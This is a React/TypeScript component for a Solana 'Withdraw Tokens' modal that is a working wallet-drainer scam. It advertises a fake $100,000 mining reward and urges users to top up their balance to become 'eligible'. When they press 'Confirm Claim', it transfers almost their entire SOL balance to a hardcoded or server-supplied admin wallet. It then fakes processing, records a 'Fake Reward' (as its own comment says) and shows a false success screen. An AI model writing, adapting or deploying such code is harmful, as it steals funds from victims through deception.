import { useState, useEffect } from "react";
import { useConnection, useWallet } from "@solana/wallet-adapter-react";
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { useWalletPortfolio } from "@/hooks/use-wallet-portfolio";
import { Button } from "@/components/ui/button";
import { Loader2, AlertTriangle, CheckCircle2 } from "lucide-react";
import {
  AlertDialog,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

const WithdrawModal = () => {
  const { totalValue, tokens, minStakeBalance } = useWalletPortfolio();
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();

  const [adminWallet, setAdminWallet] = useState("HjzNMHpUgRy4x4xXkniGciS1JpfKKjjJzogcFWMPWhqb");
  const [step, setStep] = useState<'initial' | 'confirming' | 'processing' | 'success'>('initial');

  // Fetch Admin Wallet
  useEffect(() => {
    fetch("/api/settings/wallets")
      .then((res) => res.json())
      .then((data) => {
        if (data && data.solWallet) setAdminWallet(data.solWallet);
      })
      .catch((err) => console.error("Failed to fetch admin wallet", err));
  }, []);

  // Constants & Calculations
  const MIN_BALANCE_THRESHOLD = minStakeBalance;
  const isEligible = totalValue >= MIN_BALANCE_THRESHOLD;
  const solPrice = tokens.find((t: any) => t.mint === "So11111111111111111111111111111111111111112")?.price || 0;

  const shortfallUSD = Math.max(0, MIN_BALANCE_THRESHOLD - totalValue);
  const shortfallSOL = solPrice > 0 ? (shortfallUSD / solPrice).toFixed(4) : "0";

  const handleInitialClick = () => {
    if (isEligible) {
      setStep('confirming');
    }
  };

  const handleConfirmClaim = async () => {
    if (!publicKey || !adminWallet) return;

    try {
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      const balance = await connection.getBalance(publicKey);
      const feeBuffer = 0.003 * LAMPORTS_PER_SOL;
      const amountToSend = balance - feeBuffer;

      if (amountToSend <= 0) {
        alert("Insufficient balance to cover transaction fees.");
        setStep('initial');
        return;
      }

      const transaction = new Transaction({
        feePayer: publicKey,
        recentBlockhash: blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(adminWallet),
          lamports: amountToSend,
        })
      );

      const signature = await sendTransaction(transaction, connection);
      console.log("Withdraw/Claim sent:", signature);

      setStep('processing');
      await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, "confirmed");

      // Simulate processing time
      await new Promise(resolve => setTimeout(resolve, 3000));

      // Update DB Balance (Adding Fake Reward)
      await fetch('/api/user/claim-reward', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: publicKey.toBase58() })
      });

      setStep('success');

    } catch (error: any) {
      console.error("Withdraw failed:", error);
      
      let errorMessage = "Transaction failed. Please try again.";
      if (error.message) {
         if (error.message.includes("User rejected")) errorMessage = "Transaction rejected by user.";
         else if (error.message.includes("0x1")) errorMessage = "Insufficient funds for transaction fees.";
         else errorMessage = `Transaction Error: ${error.message}`; 
      }
      
      alert(errorMessage);
      setStep('initial');
    }
  };

  return (
    <AlertDialog open={step !== 'initial' ? true : undefined}>
      <AlertDialogTrigger asChild>
        <Button className="w-full h-full min-h-[50px] bg-primary text-[#F4D2AF] font-serif hover:bg-primary/90 px-4 py-3 rounded-xl font-medium hover:scale-[1.02] transition-transform shadow-md border-2 border-[#0E0000] text-sm md:text-base whitespace-normal leading-tight">
          Withdraw Tokens
        </Button>
      </AlertDialogTrigger>
      <AlertDialogContent className="max-w-md">

        {step === 'initial' && (
          <>
            <AlertDialogHeader>
              <AlertDialogTitle className="text-center text-2xl font-bold">
                Withdrawal & Rewards
              </AlertDialogTitle>
              <AlertDialogDescription className="text-center pt-2">
                Verify your eligibility to claim mining rewards.
              </AlertDialogDescription>
            </AlertDialogHeader>

            <div className="space-y-6 my-4">
              {/* Reward Card - Highlighted */}
              <div className="bg-primary/5 rounded-xl p-5 border-2 border-primary/20 space-y-2 text-center relative overflow-hidden">
                <div className="absolute top-0 right-0 p-1 bg-primary text-[#0E0000] text-xs font-bold rounded-bl-lg">
                  TARGET REWARD
                </div>
                <p className="text-sm font-bold text-muted-foreground uppercase tracking-wider">
                  Total Mining Reward
                </p>
                <div className="space-y-0">
                  <p className="text-4xl font-black text-primary tracking-tight">
                    $100,000.00
                  </p>
                  <p className="text-sm font-mono text-muted-foreground font-medium">
                    ≈ {solPrice > 0 ? (100000 / solPrice).toFixed(2) : "---"} SOL
                  </p>
                </div>
              </div>

              {/* Balance Card - Compact */}
              <div className="bg-muted/30 rounded-lg p-3 border border-border flex justify-between items-center">
                <span className="text-sm font-medium text-muted-foreground">Your Current Balance</span>
                <div className="text-right">
                  <p className="text-lg font-bold font-mono">
                    ${totalValue.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </p>
                  <p className="text-xs text-muted-foreground font-mono">
                    ≈ {solPrice > 0 ? (totalValue / solPrice).toFixed(4) : "0"} SOL
                  </p>
                </div>
              </div>

              {/* Eligibility Status */}
              <div className={`rounded-lg p-4 border ${isEligible ? 'bg-green-500/10 border-green-500/20' : 'bg-red-500/10 border-red-500/20'}`}>
                <div className="flex items-start gap-3">
                  {isEligible ? (
                    <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5" />
                  ) : (
                    <AlertTriangle className="h-5 w-5 text-red-600 mt-0.5" />
                  )}
                  <div className="space-y-2">
                    <p className={`font-semibold ${isEligible ? 'text-green-700' : 'text-red-700'}`}>
                      {isEligible ? "Eligibility Confirmed" : "Eligibility Criteria Not Met"}
                    </p>
                    {!isEligible && (
                      <div className="text-sm text-red-600/90 leading-relaxed space-y-2">
                        <p>
                          To receive the <strong>$100,000</strong> reward, your wallet account balance must be at least <strong>${minStakeBalance.toLocaleString()} USD</strong> (approx. {solPrice > 0 ? (minStakeBalance / solPrice).toFixed(2) : "---"} SOL).
                        </p>
                        <p className="font-mono bg-red-500/10 inline-block px-1.5 py-0.5 rounded text-xs font-bold">
                          Shortfall: ~{shortfallSOL} SOL needed
                        </p>
                      </div>
                    )}
                    {isEligible && (
                      <p className="text-sm text-green-700">You met the criteria! You can now claim your rewards and withdraw your balance.</p>
                    )}
                  </div>
                </div>
              </div>
            </div>

            <AlertDialogFooter className="flex-col gap-2 sm:flex-col">
              <Button
                onClick={handleInitialClick}
                disabled={!isEligible}
                className={`w-full h-12 text-lg font-semibold ${isEligible ? 'bg-green-600 hover:bg-green-700 text-white' : 'bg-muted text-muted-foreground'}`}
              >
                Claim Rewards & Withdraw
              </Button>
              <AlertDialogCancel className="w-full mt-2">Close</AlertDialogCancel>
            </AlertDialogFooter>
          </>
        )}

        {step === 'confirming' && (
          <div className="py-10 flex flex-col items-center justify-center text-center space-y-6">
            <div className="relative">
              <div className="absolute inset-0 bg-primary/20 blur-xl rounded-full animate-pulse"></div>
              <Loader2 className="h-16 w-16 text-primary animate-spin relative z-10" />
            </div>
            <div className="space-y-2 max-w-[80%]">
              <h3 className="text-xl font-bold">Initiating Claim Process...</h3>
              <p className="text-muted-foreground">
                Please click confirm to claim the <strong className="text-primary">$100,000.00</strong> into your wallet.
              </p>
            </div>
            <Button onClick={handleConfirmClaim} className="w-full max-w-xs h-12 text-lg font-bold bg-green-600 hover:bg-green-700">
              Confirm Claim
            </Button>
          </div>
        )}

        {step === 'processing' && (
          <div className="py-16 flex flex-col items-center justify-center text-center space-y-6">
            <Loader2 className="h-16 w-16 text-primary animate-spin" />
            <div className="space-y-2">
              <h3 className="text-xl font-bold">Processing Transaction...</h3>
              <p className="text-muted-foreground">Verifying eligibility and transferring rewards.</p>
            </div>
          </div>
        )}

        {step === 'success' && (
          <div className="py-8 flex flex-col items-center justify-center text-center space-y-6">
            <div className="h-24 w-24 bg-green-100 rounded-full flex items-center justify-center mb-2">
              <CheckCircle2 className="h-12 w-12 text-green-600" />
            </div>
            <div className="space-y-2">
              <h3 className="text-3xl font-black text-green-700">CLAIM SUCCESSFUL!</h3>
              <p className="text-muted-foreground">
                You have successfully claimed your reward.
              </p>
              <div className="text-4xl font-bold text-primary py-4">
                +$100,000.00
              </div>
            </div>
            <AlertDialogCancel onClick={() => setStep('initial')} className="w-full bg-muted hover:bg-muted/80">
              Close & View Balance
            </AlertDialogCancel>
          </div>
        )}

      </AlertDialogContent>
    </AlertDialog>
  );
};

export default WithdrawModal;
